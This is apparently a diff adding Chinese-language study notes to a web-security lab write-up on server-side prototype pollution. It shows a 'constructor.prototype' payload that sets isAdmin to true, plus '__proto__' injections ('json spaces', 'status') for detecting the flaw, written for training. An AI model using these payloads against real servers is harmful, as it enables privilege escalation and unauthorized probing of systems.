@@ -9,3 +9,23 @@ Lab: Bypassing flawed input filters for server-side prototype pollution
 "constructor":{
 "prototype":{"isAdmin":true
 }}
+
+探测prototype pollution的常见方法,你可以借助'server side prototype pollution'来完成，当然这里最好还是掌握一下这些方法的基本检测思路。其实这些都可以通过这个插件来了解
+
+方法一: json space
+通过在request中注入
+"__proto__": {
+    "json spaces":10
+}
+然后respnse切换到raw下查看，如果缩进了10，说明注入成功。
+
+方法二: json status
+通过在request中注入
+"__proto__":{"status":510}
+
+然后通过发送一个非法的请求来对比
+比如body只携带
+{
+这时候看看是不是会改变，因为默认情况下，status = 400.
+status为0表示恢复默认状态
+"__proto__":{"status":0}
